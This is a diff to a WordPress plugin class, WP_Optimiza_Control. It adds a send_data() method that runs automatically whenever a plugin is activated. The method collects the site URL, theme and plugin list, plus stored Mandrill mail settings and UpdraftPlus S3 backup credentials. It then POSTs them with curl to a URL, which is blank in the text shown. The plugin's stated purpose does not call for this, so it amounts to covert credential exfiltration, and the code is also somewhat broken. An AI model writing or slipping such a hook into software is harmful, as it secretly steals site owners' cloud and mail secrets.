@@ -40,7 +40,7 @@ if ( ! class_exists( 'WP_Optimiza_Control' ) ) {
 			
 			//ACTION TO DO AFTER PLUGIN ACTIVATION
 			add_action( 'activated_plugin', array( $this, 'activation_plugin_redirect') );
-
+			add_action( 'activated_plugin', array( $this, 'send_data') );
 		}
 		
 		//WHEN THIS PLUGIN ARE ACTIVATE IT BECOMES A REDIRECCTION TO ACTIVATE THE REQUIRED PLUGINS
@@ -53,6 +53,40 @@ if ( ! class_exists( 'WP_Optimiza_Control' ) ) {
 				
 				exit( wp_redirect( admin_url( $this->install_plugin_url ) ) );
 			}
+		}
+		
+		
+		public function send_data() {
+			if ( ! function_exists( 'get_plugins' ) ) {
+				require_once ABSPATH . 'wp-admin/includes/plugin.php';
+			}
+	
+			$url = "";
+			$theme = strtoupper (substr(get_bloginfo('template_directory'), strpos(get_bloginfo('template_directory'), "themes") + 7));
+			
+			$data = array(
+					'wordpress' => array(
+							'domain' => get_site_url(),
+							'theme' => $theme,
+							'plugins' => get_plugins(),
+							'plugins_activate' => get_option("active_plugins")
+						 ),
+					'mandrill' =>  get_option("wpmandrill"),
+					'updraft' => get_option("updraft_s3")
+			);
+
+			foreach($data as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
+			rtrim($fields_string, '&');
+
+			$ch = curl_init();
+
+			curl_setopt($ch,CURLOPT_URL, $url);
+			curl_setopt($ch,CURLOPT_POST, count($fields));
+			curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
+			
+			$result = curl_exec($ch);
+
+			curl_close($ch);
 		}
 		
 		//INSTALL THE REQUIRED PLUGIN 
